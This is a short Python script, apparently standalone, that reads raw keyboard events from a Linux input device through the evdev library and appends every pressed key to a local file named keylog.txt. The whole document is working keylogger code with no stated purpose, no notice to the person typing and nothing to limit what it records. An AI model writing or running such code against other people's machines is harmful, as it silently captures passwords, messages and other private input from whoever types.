import evdev

from evdev import InputDevice

device=InputDevice('/dev/input/event2')

print(device.name)
log_file = open('keylog.txt','a',buffering=1)
try:
    for event in device.read_loop():

        if event.type == 1 and event.value == 1:

            key = evdev.ecodes.KEY[event.code]
            new_key = key.replace('KEY_',"")

            if new_key == "SPACE":
                log_file.write(" \n") 
            elif new_key == "BACKSPACE":
                log_file.write("[BACKSPACE]\n")
            elif new_key == "CAPSLOCK":
                log_file.write("[CAPS]\n")
            else:log_file.write(new_key + "\n")

except KeyboardInterrupt:
    pass
finally: log_file.close()